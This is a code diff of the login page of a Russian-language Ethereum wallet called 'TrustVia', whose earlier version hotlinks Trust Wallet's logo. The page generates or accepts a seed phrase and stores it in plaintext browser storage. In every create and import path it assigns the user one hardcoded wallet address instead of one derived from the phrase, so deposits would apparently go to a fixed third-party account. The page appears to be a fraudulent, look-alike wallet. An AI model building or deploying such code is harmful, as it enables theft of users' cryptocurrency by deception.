@@ -1,4 +1,3 @@
-<!-- auth.html -->
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -8,96 +7,95 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
     <style>
-        body { background: linear-gradient(to bottom, #0b0b0b, #121212); color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; min-height: 100dvh; display: flex; flex-direction: column; }
-        .btn-primary { background: linear-gradient(135deg, #00d676, #00e07f); color: black; font-weight: 700; border-radius: 9999px; padding: 18px; width: 100%; font-size: 17px; border: none; cursor: pointer; transition: all 0.25s; box-shadow: 0 6px 20px rgba(0,214,118,0.35); }
-        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,214,118,0.45); }
-        .btn-outline { border: 1px solid #444; color: #00d676; font-weight: 700; border-radius: 9999px; padding: 18px; width: 100%; font-size: 17px; background: transparent; cursor: pointer; transition: all 0.25s; }
-        .btn-outline:hover { background: rgba(0, 214, 118, 0.12); border-color: #00d676; }
-        textarea { background: #141414; border: 1px solid #444; color: white; border-radius: 24px; padding: 18px; font-family: monospace; font-size: 15px; resize: none; outline: none; transition: all 0.2s; height: 160px; }
-        textarea:focus { border-color: #00d676; box-shadow: 0 0 0 3px rgba(0, 214, 118, 0.25); }
-        .error-msg { color: #ff4d4d; font-size: 14px; margin-top: 10px; display: none; text-align: center; }
-        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; background: #111; padding: 20px; border-radius: 20px; border: 1px solid #222; margin: 24px 0; }
-        .word-item { color: #ccc; font-size: 14px; font-family: monospace; text-align: center; padding: 10px; background: #1a1a1a; border-radius: 10px; }
-        .back-btn { color: #00d676; font-weight: 600; font-size: 16px; background: none; border: none; padding: 0; margin-bottom: 24px; cursor: pointer; text-align: left; }
+        body { background: #0b0b0b; color: white; font-family: sans-serif; margin: 0; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        h1 { font-size: 3rem; font-weight: 900; color: #00d676; margin: 0; text-align: center; }
+        p { color: #aaa; margin: 10px 0 30px; text-align: center; }
+        button { padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 9999px; width: 100%; max-width: 320px; margin: 10px 0; cursor: pointer; transition: all 0.2s; }
+        .primary { background: #00d676; color: black; border: none; }
+        .primary:active { transform: scale(0.97); }
+        .outline { background: transparent; border: 2px solid #00d676; color: #00d676; }
+        .outline:active { background: rgba(0,214,118,0.15); }
+        textarea { width: 100%; max-width: 320px; height: 140px; background: #141414; border: 1px solid #333; color: white; border-radius: 16px; padding: 16px; font-family: monospace; margin: 10px 0; }
+        .error { color: #ff4d4d; font-size: 0.9rem; margin-top: 8px; display: none; text-align: center; }
+        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; background: #111; padding: 16px; border-radius: 16px; margin: 20px 0; }
+        .word-item { background: #1a1a1a; padding: 8px; border-radius: 8px; text-align: center; font-size: 0.9rem; font-family: monospace; }
     </style>
 </head>
-<body class="p-6">
-    <div class="flex flex-col items-center mb-12 mt-10">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="w-24 mb-6 animate-pulse" alt="TrustVia">
-        <h1 class="text-5xl font-extrabold tracking-tight bg-gradient-to-r from-[#00d676] to-[#00e07f] bg-clip-text text-transparent">TrustVia</h1>
-        <p class="text-zinc-400 mt-3 text-lg">Ваш Ethereum кошелёк</p>
-    </div>
-    <div class="w-full max-w-md space-y-5">
-        <button onclick="createWallet()" class="btn-primary uppercase tracking-widest py-6 shadow-lg">Создать новый кошелёк</button>
-        <button onclick="importWallet()" class="btn-outline uppercase tracking-widest py-6">Импортировать кошелёк</button>
+<body>
+
+    <div id="main">
+        <h1>TrustVia</h1>
+        <p>Ваш кошелёк Ethereum</p>
+
+        <button class="primary" onclick="create()">Создать кошелёк</button>
+        <button class="outline" onclick="importShow()">Импортировать</button>
     </div>
 
-    <!-- Импорт -->
-    <div id="import-section" style="display:none; margin-top:20px;">
-        <button class="back-btn" onclick="document.getElementById('import-section').style.display='none'">← Назад</button>
-        <textarea id="phraseInput" placeholder="Введите 12 или 24 слова..."></textarea>
-        <p id="import-error" class="error-msg"></p>
-        <button onclick="handleImport()" class="btn-primary mt-4">Импортировать</button>
+    <div id="create" style="display:none; width:100%; max-width:360px;">
+        <button class="outline" onclick="showMain()">← Назад</button>
+        <h2 style="text-align:center; margin:20px 0;">Секретная фраза</h2>
+        <p style="text-align:center; color:#aaa; font-size:0.95rem;">Запиши эти слова и храни в безопасности!</p>
+        <div id="words" class="word-grid"></div>
+        <button class="primary" onclick="createConfirm()">Я записал</button>
     </div>
 
-    <!-- Создание -->
-    <div id="create-section" style="display:none; margin-top:20px;">
-        <button class="back-btn" onclick="document.getElementById('create-section').style.display='none'">← Назад</button>
-        <div class="word-grid" id="word-grid"></div>
-        <button onclick="handleCreate()" class="btn-primary mt-4">Я записал фразу</button>
+    <div id="import" style="display:none; width:100%; max-width:360px;">
+        <button class="outline" onclick="showMain()">← Назад</button>
+        <h2 style="text-align:center; margin:20px 0;">Импорт</h2>
+        <textarea id="phrase" placeholder="word1 word2 word3 ..."></textarea>
+        <div id="err" class="error"></div>
+        <button class="primary" onclick="importConfirm()">Восстановить</button>
     </div>
 
     <script>
-        function createWallet() {
+        function showMain() {
+            document.getElementById('main').style.display = 'block';
+            document.getElementById('create').style.display = 'none';
+            document.getElementById('import').style.display = 'none';
+        }
+
+        function create() {
             const mnemonic = bip39.generateMnemonic();
+            localStorage.setItem('tempMnemonic', mnemonic);
             const words = mnemonic.split(' ');
             let html = '';
-            words.forEach((word, i) => {
-                html += `<div class="word-item">${i + 1}. ${word}</div>`;
-            });
-            document.getElementById('word-grid').innerHTML = html;
-            document.getElementById('create-section').style.display = 'block';
-            localStorage.setItem('tempMnemonic', mnemonic);
+            words.forEach((w, i) => html += `<div class="word-item">${i+1}. ${w}</div>`);
+            document.getElementById('words').innerHTML = html;
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('create').style.display = 'block';
         }
 
-        function importWallet() {
-            document.getElementById('import-section').style.display = 'block';
-        }
-
-        function handleCreate() {
-            localStorage.setItem('mnemonic', localStorage.getItem('tempMnemonic'));
-            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
-            window.location.href = 'index.html';
-        }
-
-        function handleImport() {
-            const phrase = document.getElementById('phraseInput').value.trim();
-            const errorEl = document.getElementById('import-error');
-            errorEl.style.display = 'none';
-
-            if (!phrase) {
-                errorEl.textContent = 'Введите секретную фразу';
-                errorEl.style.display = 'block';
-                return;
+        function createConfirm() {
+            if (confirm('Ты точно записал все слова?')) {
+                localStorage.setItem('mnemonic', localStorage.getItem('tempMnemonic'));
+                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
+                window.location.href = 'index.html';
             }
+        }
 
+        function importShow() {
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('import').style.display = 'block';
+        }
+
+        function importConfirm() {
+            const phrase = document.getElementById('phrase').value.trim();
+            const err = document.getElementById('err');
+            err.style.display = 'none';
+
+            if (!phrase) { err.textContent = 'Введи фразу'; err.style.display = 'block'; return; }
             const words = phrase.split(/\s+/).filter(w => w);
-            if (words.length !== 12 && words.length !== 24) {
-                errorEl.textContent = 'Фраза должна содержать 12 или 24 слова';
-                errorEl.style.display = 'block';
-                return;
-            }
+            if (words.length !== 12 && words.length !== 24) { err.textContent = 'Нужно 12 или 24 слова'; err.style.display = 'block'; return; }
+            if (!bip39.validateMnemonic(phrase)) { err.textContent = 'Неверная фраза'; err.style.display = 'block'; return; }
 
-            if (!bip39.validateMnemonic(phrase)) {
-                errorEl.textContent = 'Неверная фраза';
-                errorEl.style.display = 'block';
-                return;
+            if (confirm('Ты уверен?')) {
+                localStorage.setItem('mnemonic', phrase);
+                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
+                window.location.href = 'index.html';
             }
-
-            localStorage.setItem('mnemonic', phrase);
-            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
-            window.location.href = 'index.html';
         }
+
+        showMain();
     </script>
 </body>
 </html>
